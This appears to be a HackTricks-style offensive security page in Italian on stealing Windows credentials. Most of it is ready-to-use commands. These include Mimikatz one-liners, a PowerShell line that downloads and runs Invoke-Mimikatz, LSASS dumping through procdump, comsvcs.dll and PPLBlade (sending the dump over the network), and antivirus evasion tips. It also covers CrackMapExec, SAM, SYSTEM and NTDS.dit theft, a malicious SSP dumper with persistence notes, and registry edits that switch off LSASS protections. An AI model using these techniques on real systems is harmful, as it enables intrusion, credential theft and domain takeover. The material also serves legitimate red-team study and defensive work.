# Rubare le credenziali di Windows

{{#include ../../banners/hacktricks-training.md}}

## Credenziali Mimikatz
```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
**Scopri altre cose che Mimikatz può fare in** [**questa pagina**](credentials-mimikatz.md)**.**

### Invoke-Mimikatz
```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
[**Scopri alcune possibili protezioni delle credenziali qui.**](credentials-protections.md) **Queste protezioni potrebbero impedire a Mimikatz di estrarre alcune credenziali.**

## Credentials with Meterpreter

Usa il [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **che** ho creato per **cercare password e hash** all'interno del sistema della vittima.
```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```
## Bypassing AV

### Procdump + Mimikatz

Poiché **Procdump** da [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite) **è uno strumento legittimo di Microsoft**, non viene rilevato da Defender.\
Puoi usare questo strumento per **dump the lsass process**, **download the dump** e **extract** le **credentials locally** dal dump.

Puoi anche usare [SharpDump](https://github.com/GhostPack/SharpDump).
```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Get it from webdav
\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
Questo processo viene eseguito automaticamente con [SprayKatz](https://github.com/aas-n/spraykatz): `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Note**: Alcuni **AV** potrebbero **rilevare** come **malevolo** l'uso di **procdump.exe to dump lsass.exe**, questo perché rilevano la stringa **"procdump.exe" and "lsass.exe"**. Quindi è **meno rilevabile** passare come **argomento** il **PID** di lsass.exe a procdump **invece del** **nome lsass.exe.**

### Dump di lsass con **comsvcs.dll**

Una DLL chiamata **comsvcs.dll** presente in `C:\Windows\System32` è responsabile del **dumping della memoria del processo** in caso di crash. Questa DLL include una **function** chiamata **`MiniDumpW`**, progettata per essere invocata tramite `rundll32.exe`.\
Non è rilevante usare i primi due argomenti, ma il terzo è suddiviso in tre componenti. L'ID del processo da dumpare costituisce la prima componente, la posizione del file di dump rappresenta la seconda, e la terza componente è strettamente la parola **full**. Non esistono alternative.\
Dopo aver parsato queste tre componenti, la DLL procede a creare il file di dump e a trasferire in esso la memoria del processo specificato.\
L'utilizzo di **comsvcs.dll** è fattibile per dumpare il processo lsass, eliminando così la necessità di caricare ed eseguire procdump. Questo metodo è descritto in dettaglio su [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords).

The following command is employed for execution:
```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```
**Puoi automatizzare questo processo con** [**lssasy**](https://github.com/Hackndo/lsassy)**.**

### **Dumping lsass con Task Manager**

1. Fai clic con il tasto destro sul Task Bar e seleziona Task Manager
2. Clicca su More details
3. Cerca il processo "Local Security Authority Process" nella tab Processes
4. Fai clic con il tasto destro sul processo "Local Security Authority Process" e seleziona "Create dump file".

### Dumping lsass con procdump

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) è un eseguibile firmato Microsoft che fa parte della suite [sysinternals](https://docs.microsoft.com/en-us/sysinternals/).
```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```
## Dumpin lsass con PPLBlade

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) è un Protected Process Dumper Tool che supporta l'offuscamento dei memory dump e il trasferimento su workstation remote senza scriverli su disco.

**Funzionalità principali**:

1. Eseguire il bypass della protezione PPL
2. Offuscare i memory dump per eludere i meccanismi di rilevamento basati su signature di Defender
3. Caricare i memory dump usando metodi RAW e SMB senza scriverli su disco (fileless dump)
```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```
## LalsDumper – SSP-based LSASS dumping without MiniDumpWriteDump

Ink Dragon fornisce un dumper in tre fasi chiamato **LalsDumper** che non invoca mai `MiniDumpWriteDump`, quindi le hook EDR su quella API non vengono mai attivate:

1. **Stage 1 loader (`lals.exe`)** – cerca in `fdp.dll` un segnaposto costituito da 32 caratteri `d` minuscoli, lo sovrascrive con il percorso assoluto a `rtu.txt`, salva la DLL patchata come `nfdp.dll` e chiama `AddSecurityPackageA("nfdp","fdp")`. Questo forza **LSASS** a caricare la DLL malevola come nuovo Security Support Provider (SSP).
2. **Stage 2 inside LSASS** – quando LSASS carica `nfdp.dll`, la DLL legge `rtu.txt`, esegue XOR di ogni byte con `0x20` e mappa il blob decodificato in memoria prima di trasferire l'esecuzione.
3. **Stage 3 dumper** – il payload mappato reimplementa la logica di MiniDump usando **direct syscalls** risolti da nomi API hashed (`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`). Un export dedicato chiamato `Tom` apre `%TEMP%\<pid>.ddt`, scrive in streaming un dump compresso di LSASS nel file e chiude l'handle così l'esfiltrazione può avvenire in seguito.

Note per l'operatore:

* Tieni `lals.exe`, `fdp.dll`, `nfdp.dll` e `rtu.txt` nella stessa directory. La Stage 1 riscrive il segnaposto hard-coded con il percorso assoluto a `rtu.txt`, quindi separarli interrompe la catena.
* La registrazione avviene aggiungendo `nfdp` a `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages`. Puoi impostare manualmente quel valore per far sì che LSASS ricarichi l'SSP ad ogni boot.
* I file `%TEMP%\*.ddt` sono dump compressi. Decomprimi localmente, poi forniscili a Mimikatz/Volatility per l'estrazione delle credenziali.
* L'esecuzione di `lals.exe` richiede privilegi admin/SeTcb affinché `AddSecurityPackageA` abbia successo; una volta che la chiamata ritorna, LSASS carica trasparentemente l'SSP rogue ed esegue la Stage 2.
* Rimuovere la DLL dal disco non la rimuove dalla memoria di LSASS. Elimina la voce di registro e riavvia LSASS (reboot) oppure lasciala per persistenza a lungo termine.

## CrackMapExec

### Dump degli hash SAM
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```
### Dump LSA secrets
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```
### Dump il NTDS.dit dal DC bersaglio
```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```
### Estrapolare la cronologia delle password da NTDS.dit sul DC di destinazione
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```
### Mostra l'attributo pwdLastSet per ogni account NTDS.dit
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```
## Stealing SAM & SYSTEM

Questi file dovrebbero essere **posizionati** in _C:\windows\system32\config\SAM_ e _C:\windows\system32\config\SYSTEM_. Ma **non puoi semplicemente copiarli in modo normale** perché sono protetti.

### Dal Registro

Il modo più semplice per steal quei file è ottenere una copia dal registro:
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
**Scarica** quei file sulla tua macchina Kali e **estrai gli hash** usando:
```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### Volume Shadow Copy

Puoi copiare file protetti usando questo servizio. Devi essere Administrator.

#### Uso di vssadmin

Il binario vssadmin è disponibile solo nelle versioni di Windows Server
```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
Ma puoi fare lo stesso da **Powershell**. Questo è un esempio di **come copiare il file SAM** (l'unità usata è "C:" e viene salvato in C:\users\Public) ma puoi usare questo per copiare qualsiasi file protetto:
```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
$voume.Delete();if($notrunning -eq 1){$service.Stop()}
```
### Invoke-NinjaCopy

Infine, puoi anche usare lo [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) per creare una copia di SAM, SYSTEM e ntds.dit.
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```
## **Active Directory Credenziali - NTDS.dit**

Il file **NTDS.dit** è noto come il cuore di **Active Directory**, contenendo dati cruciali sugli oggetti utente, i gruppi e le loro appartenenze. È lì che vengono memorizzate le **password hashes** per gli utenti di dominio. Questo file è un database **Extensible Storage Engine (ESE)** e si trova in **_%SystemRoom%/NTDS/ntds.dit_**.

All'interno di questo database sono mantenute tre tabelle principali:

- **Data Table**: Questa tabella è incaricata di memorizzare i dettagli sugli oggetti come utenti e gruppi.
- **Link Table**: Tiene traccia delle relazioni, come le appartenenze ai gruppi.
- **SD Table**: Qui sono memorizzati i **Security descriptors** per ogni oggetto, garantendo la sicurezza e il controllo degli accessi per gli oggetti memorizzati.

More information about this: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)

Windows uses _Ntdsa.dll_ to interact with that file and its used by _lsass.exe_. Then, **part** of the **NTDS.dit** file could be located **inside the `lsass`** memory (you can find the latest accessed data probably because of the performance improve by using a **cache**).

#### Decrittazione degli hash all'interno di NTDS.dit

L'hash è cifrato 3 volte:

1. Decifrare la Password Encryption Key (**PEK**) usando la **BOOTKEY** e **RC4**.
2. Decifrare l'**hash** usando **PEK** e **RC4**.
3. Decifrare l'**hash** usando **DES**.

**PEK** ha lo **stesso valore** in **ogni domain controller**, ma è **cifrato** all'interno del file **NTDS.dit** usando la **BOOTKEY** del **file SYSTEM del domain controller (è diversa tra i domain controller)**. Per questo, per ottenere le credenziali dal file NTDS.dit **sono necessari i file NTDS.dit e SYSTEM** (_C:\Windows\System32\config\SYSTEM_).

### Copia di NTDS.dit usando Ntdsutil

Disponibile a partire da Windows Server 2008.
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```
Puoi anche usare il [**volume shadow copy**](#stealing-sam-and-system) per copiare il file **ntds.dit**. Ricorda che avrai anche bisogno di una copia del file **SYSTEM** (di nuovo, [**dump it from the registry or use the volume shadow copy**](#stealing-sam-and-system)).

### **Estrazione degli hash da NTDS.dit**

Una volta che hai **ottenuto** i file **NTDS.dit** e **SYSTEM** puoi usare strumenti come _secretsdump.py_ per **estrarre gli hash**:
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
Puoi anche **estrarli automaticamente** usando un domain admin valido:
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```
Per **grandi file NTDS.dit** è consigliabile estrarlo usando [gosecretsdump](https://github.com/c-sto/gosecretsdump).

Infine, puoi anche usare il **metasploit module**: _post/windows/gather/credentials/domain_hashdump_ o **mimikatz** `lsadump::lsa /inject`

### **Estrazione di oggetti di dominio da NTDS.dit in un database SQLite**

Gli oggetti NTDS possono essere estratti in un database SQLite con [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). Non vengono estratti solo i secrets, ma anche gli oggetti completi e i loro attributi per ulteriori estrazioni di informazioni quando il raw NTDS.dit file è già stato recuperato.
```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
L'hive `SYSTEM` è opzionale ma consente la decrittazione dei segreti (NT & LM hashes, credenziali supplementari come cleartext passwords, kerberos o trust keys, cronologie delle password NT & LM). Insieme ad altre informazioni, vengono estratti i seguenti dati: account utente e macchina con i loro hash, UAC flags, timestamp dell'ultimo logon e della modifica della password, descrizioni degli account, nomi, UPN, SPN, gruppi e appartenenze ricorsive, albero delle unità organizzative e appartenenze, trusted domains con tipo di trust, direzione e attributi...

## Lazagne

Scarica il binario da [here](https://github.com/AlessandroZ/LaZagne/releases). Puoi usare questo binario per estrarre credentials da diversi software.
```
lazagne.exe all
```
## Altri strumenti per l'estrazione di credenziali da SAM e LSASS

### Windows credentials Editor (WCE)

Questo strumento può essere usato per estrarre credenziali dalla memoria. Scaricalo da: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

Estrae credenziali dal file SAM
```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```
### PwDump

Estrai credentials dal SAM file
```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```
### PwDump7

Download it from:[ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) and just **eseguirlo** and the passwords will be extracted.

## Scansione delle sessioni RDP inattive e indebolimento dei controlli di sicurezza

Ink Dragon’s FinalDraft RAT includes a `DumpRDPHistory` tasker whose techniques are handy for any red-teamer:

### DumpRDPHistory-style telemetry collection

* **Target RDP in uscita** – analizza ogni hive utente in `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*`. Ogni sottochiave memorizza il server name, `UsernameHint`, e il timestamp dell'ultima scrittura. Puoi replicare la logica di FinalDraft con PowerShell:

```powershell
Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
Get-ChildItem "${_.Name}\SOFTWARE\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue |
ForEach-Object {
$server = Split-Path $_.Name -Leaf
$user = (Get-ItemProperty $_.Name).UsernameHint
"OUT:$server:$user:$((Get-Item $_.Name).LastWriteTime)"
}
}
```

* **Evidenza RDP in ingresso** – interroga il log `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` per gli Event ID **21** (accesso riuscito) e **25** (disconnessione) per mappare chi ha amministrato la macchina:

```powershell
Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
| Where-Object { $_.Id -in 21,25 } \
| Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
```

Una volta che sai quale Domain Admin si connette regolarmente, dumpa LSASS (con LalsDumper/Mimikatz) mentre la loro sessione **disconnessa** è ancora presente. CredSSP + NTLM fallback lasciano il loro verifier e i token in LSASS, che possono poi essere riutilizzati via SMB/WinRM per recuperare `NTDS.dit` o impiantare persistenza sui domain controllers.

### Modifiche al registro mirate da FinalDraft
```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
```
* Impostare `DisableRestrictedAdmin=1` forza il riutilizzo completo delle credenziali/ticket durante RDP, abilitando pivot in stile pass-the-hash.
* `LocalAccountTokenFilterPolicy=1` disabilita il filtraggio dei token di UAC, così gli amministratori locali ricevono token senza restrizioni sulla rete.
* `DSRMAdminLogonBehavior=2` permette all'amministratore DSRM di accedere mentre il DC è online, fornendo agli attaccanti un altro account integrato ad alto privilegio.
* `RunAsPPL=0` rimuove le protezioni LSASS PPL, rendendo l'accesso alla memoria molto semplice per dumpers come LalsDumper.

## Riferimenti

- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)

{{#include ../../banners/hacktricks-training.md}}
